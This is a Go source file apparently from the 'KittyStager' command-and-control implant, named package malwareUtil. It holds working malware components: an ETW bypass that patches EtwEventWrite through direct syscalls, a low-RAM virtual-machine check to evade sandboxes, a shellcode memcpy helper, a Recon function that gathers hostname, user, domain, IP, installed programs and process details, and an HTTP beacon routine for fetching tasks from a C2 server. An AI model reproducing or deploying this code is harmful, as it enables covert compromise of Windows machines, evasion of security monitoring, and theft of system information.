package malwareUtil

import (
	"KittyStager/cmd/util"
	"encoding/json"
	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	_ "github.com/fourcorelabs/wintoken"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"time"
	"unsafe"
)

var (
	fntdll  = windows.NewLazyDLL("ntdll.dll")
	fucketw = fntdll.NewProc("EtwEventWrite")
	k32     = windows.NewLazyDLL("kernel32.dll")
)

// https://github.com/timwhitez/Doge-Assembly/blob/main/loader/etw.go
// write arbitrary ret opcodes into the ETW event writing function (EtwEventWrite) to bypass ETW

func EtwHell(hProcess uintptr) {
	var oldProtect uint32
	//c21400
	var patch = []byte{0xc2, 0x14, 0x00}
	bp, _ := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	//resolve the functions and extract the syscalls
	protect, _ := bp.GetSysID("NtProtectVirtualMemory")
	write, _ := bp.GetSysID("NtWriteVirtualMemory")
	bananaphone.Syscall(protect, fucketw.Addr(), 1, windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	bananaphone.Syscall(write, hProcess, fucketw.Addr(), uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)), 0)
	bananaphone.Syscall(protect, fucketw.Addr(), 1, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}

func VmCheck() bool {
	var proc = k32.NewProc("GetPhysicallyInstalledSystemMemory")
	var mem uint64
	proc.Call(uintptr(unsafe.Pointer(&mem)))
	// if ram is less than 1GB, return false
	if mem < 1000000 {
		return true
	}
	return false
}

// https://github.dev/timwhitez/Doge-Gabh/blob/main/example/shellcodecalc/calc.go
func Memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}

// Recon does some basic recon on the target
func Recon() []byte {
	var iniCheck util.InitialChecks
	// get machine name
	hostname, _ := os.Hostname()
	iniCheck.SetHostname(hostname)
	//get username
	iniCheck.SetUsername(os.Getenv("USERNAME"))
	//get domain
	iniCheck.SetDomain(os.Getenv("USERDOMAIN"))
	//get local ip
	iniCheck.Ip = getLocalIP()
	//get kittenName
	iniCheck.SetKittenName(generateName())
	//get Programe Files
	dir, _ := os.ReadDir("C:\\Program Files")
	for _, file := range dir {
		iniCheck.SetDir(append(iniCheck.Dir, file.Name()))
	}
	dir86, _ := os.ReadDir("C:\\Program Files (x86)")
	for _, file := range dir86 {
		iniCheck.SetDir(append(iniCheck.Dir, file.Name()))
	}
	//process
	//pid
	iniCheck.SetPid(os.Getpid())
	//process name
	iniCheck.SetPName(os.Args[0])
	//current path
	currentPath, _ := os.Getwd()
	iniCheck.SetPath(currentPath)
	j, _ := json.Marshal(iniCheck)
	return j
}

// https://stackoverflow.com/questions/23558425/how-do-i-get-the-local-ip-address-in-go
// This does not open a connection
func getLocalIP() string {
	conn, _ := net.Dial("udp", "100.100.100.100:3480")
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr).IP.String()
	return localAddr
}

func generateName() string {
	letters := []rune("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
	s1 := rand.NewSource(time.Now().UnixNano())
	r1 := rand.New(s1)
	b := make([]rune, 4)
	for i := range b {
		b[i] = letters[r1.Intn(len(letters))]
	}
	return string(b)
}

func Request(cookie string, conf []string) ([]byte, error) {
	var body []byte
	c := http.Client{Timeout: time.Duration(3) * time.Second}
	req, _ := http.NewRequest("GET", conf[0], nil)

	req.Header.Add("User-Agent", conf[1])
	if cookie != "" {
		req.Header.Add("Cookie", cookie)
	}
	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}
	body, _ = ioutil.ReadAll(resp.Body)
	return body, nil
}

func Sleep(t int) {
	time.Sleep(time.Duration(t) * time.Second)
}

// UnmarshalJSON unmarshal the json
func UnmarshalJSON(j []byte) (util.Task, error) {
	var iniCheck util.Task
	err := json.Unmarshal(j, &iniCheck)
	if err != nil {
		return util.Task{}, err
	}
	return iniCheck, nil
}
